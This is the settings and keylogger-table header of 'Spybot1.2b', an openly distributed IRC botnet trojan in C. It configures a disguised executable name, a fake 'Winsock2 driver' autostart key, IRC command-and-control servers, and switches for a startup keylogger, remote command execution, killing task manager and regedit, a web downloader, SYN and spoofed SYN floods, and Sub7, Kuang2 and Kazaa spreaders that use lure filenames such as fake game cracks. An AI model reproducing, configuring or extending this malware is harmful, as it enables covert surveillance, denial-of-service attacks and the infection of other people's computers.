//////////////////////////////////////////////////////////
//							//
//		Spybot1.2b beta by Mich			//
//							//
//		Opensource irc bot 			//
//							//
//	    IRC: irc.babbels.com #dreams		//
//							//
//	http://members.lycos.co.uk/ircspybot/		//
//	    						//
//	      opensource_bot@hotmail.com		//
//	    						//
//		use at your own risk.			//
//							//
//	       Good luck and have fun!			//
//							//
//////////////////////////////////////////////////////////
       

///////////////////bots settings//////////////////////////


char filename[] = "wuaumqr.exe"; //bots filename 
char login_command[] = "login"; //this is the command to login 
char password[] = "password"; //bots password 
char channel[] = "#spybot1.2b"; //channel bot joins on connect 
char channelpass[] = "chanpass"; //password of the channel 
const int maxlogins = 3; // maximum number of logins
char valuename[] = "Winsock2 driver"; //autostart key
int decryptkey = 9; //decrypt key 
char mutexname[] = "spybot1.2b"; //only one bot with the same mutexname will run on the same pc
char Bot_Version[] = "spybot1.2b_beta"; 
BOOL topiccommands = TRUE; //enable topic commands
int Flood_delay = 2000; //time in msec. to waith so bot doesnt flood offline
#define start_keylogger_afterstartup; //when define't all keys are logged to systemdir+keylogfilename
#define rawcommands_after_connect;
//#define rawcommands_after_join;
//#define start_httpserver_afterstartup; 
//#define Check_for_internetconnection; 
#define use_funstuf; //enables or disables open cd-rom, flash keyboard lights and sendkeys
#define remote_cmd;
#define Use_Firewall_killer;
#define WEB_DOWNLOAD; //enables the web downloader
#define SYN_FLOOD; //enable to use the synflooder
#define SPOOFD_SYNFLOOD; //works only on win 2000 XP
#define SUB7_SPREADER; //enable to use the sub7 spreader 
//#define KAZAA_SPREADER; //enable to use the kazaa spreader
#define KUANG2_SPREADER;
#define MAX_PORTSCAN_SOCKETS_TO_USE 30 //max number of sockets to use with the portscanner

//servers

char *ircservers[]={
	"127.0.0.1",
	"chat.planet.nl",
	NULL //dont remove this line
};

//number of ports MUST be the same as the number of servers you use, 

int serverports[]={ 
	6667,
	6667,
};

//http server

#ifdef start_httpserver_afterstartup 
char root_dir[] = "C:\\"; //default directory where users have access to including subdirs (you must enter 2 \\ else it will generate errors example: char root_dir[] = "C:\\program files\\webserver\\www\\"; )
int http_poort = 81; //default port for the http_server 
#endif

//keylogger

#ifdef start_keylogger_afterstartup
char keylogfilename[] = "keylog.txt"; 
#endif

//rawcommands the bot will send these commands to the ircserver after a connection if you use the word $NICK it will be replaced with de bot's current nick (case sensitive)

#ifdef  rawcommands_after_connect
char *rawcommands[]={ 
	"MODE $NICK +i", 
	NULL //dont remove this line
};
#endif

//onjoincommands the bot will send these commands to the ircserver after it has joined a channel if you use the word $CHAN it will be replaced with the channel it joins (case sensitive)

#ifdef rawcommands_after_join
char *onjoin_commands[]={ 
	"MODE $CHAN +nts",
	"MODE $CHAN +k chanpass",
	NULL //dont remove this line
};
#endif


//bot will check if the hostname is in the list when logging in 
//you can use wildcard's "*" only at the begin or the end of the hostname and only 1 the bot will ONLY look at the ip address not at the username/nick so DON'T enter *!user@my.host.com (it looks only at the my.host.com)
//examples:
// 127.0.0.* matches 127.0.0.1 and 127.0.0.1111 and 127.0.0.1.1.1.1.1 etc.
// *.my.host.com matches 123.my.host.com and 1.my.host.com and this.is.my.host.com

//Test on al the servers you have given witch hostmask the use, some hide your ip address and sometimes the cant resolve your ip  

//#define use_hostname_match;


#ifdef use_hostname_match
//add the trustedhosts here 
char *trustedhosts[]={ 
	"*.0.0.*",
	"*.nl",
	"*.com",
	NULL //dont remove this line
};
#endif

//#define use_ident_match;

//ident is the part between the ! and @     nick!ident@hostname

#ifdef use_ident_match
char *trustedidents[]={
	"Mich",
	"ILLuSiVe",
	NULL
};
#endif


//#define use_nickname_match;


#ifdef use_nickname_match
char *trustednicks[]={
	"Mich",
	"ILLuSiVe",
	NULL
};
#endif



//if you enable this then you cant controll the bot with the normal commands you must first encrypt them exept with the login command
//to do that type in mirc /encrypt [key] scan 0 17300 2 kuang and past the result in the room dont use this if you dont now what it does 

//#define Use_Encrypted_commands
#ifdef Use_Encrypted_commands
int commands_decryptkey = 4;
#endif

// AVS/Firewall killer

#ifdef Use_Firewall_killer

int killer_delay = 2000;

//ALL filenames must be in uppercase!
char *kill_list[]={
	"REGEDIT.EXE",
	"MSCONFIG.EXE",
	"TASKMGR.EXE",
	"NETSTAT.EXE", 
	NULL //dont remove this line
};
#endif

//KaZaa spreader

//filenames to use with the kazaa spreader enter as many as you want 
#ifdef KAZAA_SPREADER
char *kazaa_files[]={ 
	"zoneallarm_pro_crack.exe",
	"AVP_Crack.exe",
	"Porn.exe",
	"Battlefield1942_bloodpatch.exe",
	"Unreal2_bloodpatch.exe",
	"UT2003_bloodpatch.exe",
	"AquaNox2 Crack.exe",
	"NBA2003_crack.exe",
	"FIFA2003 crack.exe",
	"C&C Generals_crack.exe",
	NULL
};
#endif

/////////////////// end bots settings//////////////////////////


//dont change this its for the keylogger and the sendkeys function
int inputL[]={
	8,
	13,
	27,
	112,
	113,
	114,
	115,
	116,
	117,
	118,
	119,
	120,
	121,
	122,
	123,
	192,
	49,
	50,
	51,
	52,
	53,
	54,
	55,
	56,
	57,
	48,
	189,
	187,
	9,
	81,
	87,
	69,
	82,
	84,
	89,
	85,
	73,
	79,
	80,
	219,
	221,
	65,
	83,
	68,
	70,
	71,
	72,
	74,
	75,
	76,
	186,
	222,
	90,
	88,
	67,
	86,
	66,
	78,
	77,
	188,
	190,
	191,
	220,
	17,
	91,
	32,
	92,
	44,
	145,
	45,
	36,
	33,
	46,
	35,
	34,
	37,
	38,
	39,
	40,
	144,
	111,
	106,
	109,
	107,
	96,
	97,
	98,
	99,
	100,
	101,
	102,
	103,
	104,
	105,
	110,
};

char *outputL[]={
	"b",
	"e",
	"[ESC]",
	"[F1]",
	"[F2]",
	"[F3]",
	"[F4]",
	"[F5]",
	"[F6]",
	"[F7]",
	"[F8]",
	"[F9]",
	"[F10]",
	"[F11]",
	"[F12]",
	"`",
	"1",
	"2",
	"3",
	"4",
	"5",
	"6",
	"7",
	"8",
	"9",
	"0",
	"-",
	"=",
	"[TAB]",
	"q",
	"w",
	"e",
	"r",
	"t",
	"y",
	"u",
	"i",
	"o",
	"p",
	"[",
	"]",
	"a",
	"s",
	"d",
	"f",
	"g",
	"h",
	"j",
	"k",
	"l",
	";",
	"'",
	"z",
	"x",
	"c",
	"v",
	"b",
	"n",
	"m",
	",",
	".",
	"/",
	"\\",
	"[CTRL]",
	"[WIN]",
	" ",
	"[WIN]",
	"[Print Screen]",
	"[Scroll Lock]",
	"[Insert]",
	"[Home]",
	"[Pg Up]",
	"[Del]",
	"[End]",
	"[Pg Dn]",
	"[Left]",
	"[Up]",
	"[Right]",
	"[Down]",
	"[Num Lock]",
	"/",
	"*",
	"-",
	"+",
	"0",
	"1",
	"2",
	"3",
	"4",
	"5",
	"6",
	"7",
	"8",
	"9",
	".",
}; 




char *outputH[]={
	"b",
	"e",
	"[ESC]",
	"[F1]",
	"[F2]",
	"[F3]",
	"[F4]",
	"[F5]",
	"[F6]",
	"[F7]",
	"[F8]",
	"[F9]",
	"[F10]",
	"[F11]",
	"[F12]",
	"~",
	"!",
	"@",
	"#",
	"$",
	"%",
	"^",
	"&",
	"*",
	"(",
	")",
	"_",
	"+",
	"[TAB]",
	"Q",
	"W",
	"E",
	"R",
	"T",
	"Y",
	"U",
	"I",
	"O",
	"P",
	"{",
	"}",
	"A",
	"S",
	"D",
	"F",
	"G",
	"H",
	"J",
	"K",
	"L",
	":",
	"\"",
	"Z",
	"X",
	"C",
	"V",
	"B",
	"N",
	"M",
	"<",
	">",
	"?",//strange ?? dont know why but only a ? did not work
	"|",
	"[CTRL]",
	"[WIN]",
	" ",
	"[WIN]",
	"[Print Screen]",
	"[Scroll Lock]",
	"[Insert]",
	"[Home]",
	"[Pg Up]",
	"[Del]",
	"[End]",
	"[Pg Dn]",
	"[Left]",
	"[Up]",
	"[Right]",
	"[Down]",
	"[Num Lock]",
	"/",
	"*",
	"-",
	"+",
	"0",
	"1",
	"2",
	"3",
	"4",
	"5",
	"6",
	"7",
	"8",
	"9",
	".",
};